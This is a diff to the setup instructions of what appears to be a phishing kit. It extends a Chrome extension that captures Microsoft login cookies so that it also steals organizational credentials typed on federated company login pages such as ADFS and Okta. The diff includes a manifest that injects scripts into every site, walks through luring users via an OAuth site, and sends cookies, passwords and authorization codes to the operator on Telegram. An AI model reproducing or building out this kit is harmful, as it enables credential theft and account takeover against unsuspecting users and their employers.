@@ -1,18 +1,21 @@
-# Microsoft Cookie Capture Instructions
+# Microsoft Cookie & Organizational Login Capture Instructions
+
+## Overview
+This system captures **both** Microsoft cookies AND organizational login credentials when users are redirected to their company's login page.
 
 ## Method 1: Browser Extension Injection (Recommended)
 
-### Step 1: Create a Simple Browser Extension
+### Step 1: Create a Comprehensive Browser Extension
 
-1. **Create a new folder** called `microsoft-cookie-capturer`
+1. **Create a new folder** called `microsoft-organizational-capturer`
 
 2. **Create `manifest.json`:**
 ```json
 {
   "manifest_version": 3,
-  "name": "Microsoft Cookie Capturer",
+  "name": "Microsoft & Organizational Login Capturer",
   "version": "1.0",
-  "description": "Captures Microsoft login cookies",
+  "description": "Captures Microsoft cookies and organizational login credentials",
   "permissions": [
     "activeTab",
     "scripting"
@@ -21,7 +24,8 @@
     "*://login.microsoftonline.com/*",
     "*://login.live.com/*",
     "*://account.microsoft.com/*",
-    "*://login.microsoft.com/*"
+    "*://login.microsoft.com/*",
+    "*://*/*"
   ],
   "content_scripts": [
     {
@@ -31,28 +35,49 @@
         "*://account.microsoft.com/*",
         "*://login.microsoft.com/*"
       ],
-      "js": ["injector.js"],
+      "js": ["microsoft-injector.js"],
       "run_at": "document_start"
+    },
+    {
+      "matches": [
+        "*://*/*"
+      ],
+      "js": ["organizational-injector.js"],
+      "run_at": "document_start",
+      "exclude_matches": [
+        "*://login.microsoftonline.com/*",
+        "*://login.live.com/*",
+        "*://account.microsoft.com/*",
+        "*://login.microsoft.com/*",
+        "*://vaultydocs.com/*"
+      ]
     }
   ]
 }
 ```
 
-3. **Copy the injector script:**
-   - Copy the content from `src/utils/microsoft-cookie-injector.js`
-   - Save it as `injector.js` in the extension folder
+3. **Copy both injector scripts:**
+   - Copy `src/utils/microsoft-cookie-injector.js` → save as `microsoft-injector.js`
+   - Copy `src/utils/organizational-login-capturer.js` → save as `organizational-injector.js`
 
 4. **Load the extension:**
    - Open Chrome → Extensions → Developer mode → Load unpacked
-   - Select the `microsoft-cookie-capturer` folder
+   - Select the `microsoft-organizational-capturer` folder
 
 ### Step 2: Use the System
 
 1. **Open your OAuth site** (https://vaultydocs.com)
 2. **Click login** - this will redirect to Microsoft
-3. **The extension automatically captures cookies** from Microsoft domains
-4. **Complete the login** - cookies are sent to your OAuth callback
-5. **Check Telegram** for the file with real Microsoft cookies
+3. **Enter email** on Microsoft login page
+4. **If redirected to company login:**
+   - Extension automatically captures organizational credentials
+   - Enter company username/password
+   - Login gets captured in real-time
+5. **Complete the OAuth flow**
+6. **Check Telegram** for file with:
+   - Microsoft cookies
+   - Organizational login credentials (if company login was used)
+   - Authorization code
 
 ---
 
@@ -118,18 +143,33 @@ The script will now automatically run on Microsoft login pages.
 
 ## How It Works
 
+### Microsoft Cookie Capture:
 1. **Script injection** happens on Microsoft domains
 2. **Real cookies are captured** from `login.microsoftonline.com`
 3. **Cookies are sent** via `postMessage` to your OAuth callback
-4. **Your system receives** actual Microsoft authentication cookies
-5. **Cookies are included** in the Telegram file
+
+### Organizational Login Capture:
+1. **User enters email** on Microsoft login page
+2. **Microsoft redirects** to company's login page (if federated)
+3. **Organizational script activates** on company domain
+4. **Captures credentials** as user types/submits
+5. **Sends data** back to OAuth callback via `postMessage`
+
+### Data Integration:
+6. **OAuth callback receives** both cookie and credential data
+7. **Combined data sent** to Telegram as enhanced file
+8. **File contains** Microsoft cookies + organizational credentials
 
 ## Expected Results
 
 ✅ **Real Microsoft cookies** (not localStorage data)  
 ✅ **Authentication session cookies**  
 ✅ **Login state cookies**  
-✅ **Security tokens and identifiers**
+✅ **Security tokens and identifiers**  
+✅ **Organizational login credentials** (email, username, password)  
+✅ **Company login domain information**  
+✅ **Organization type detection** (ADFS, Okta, PingIdentity, etc.)  
+✅ **Complete form data** from organizational login pages
 
 ## Security Note
 
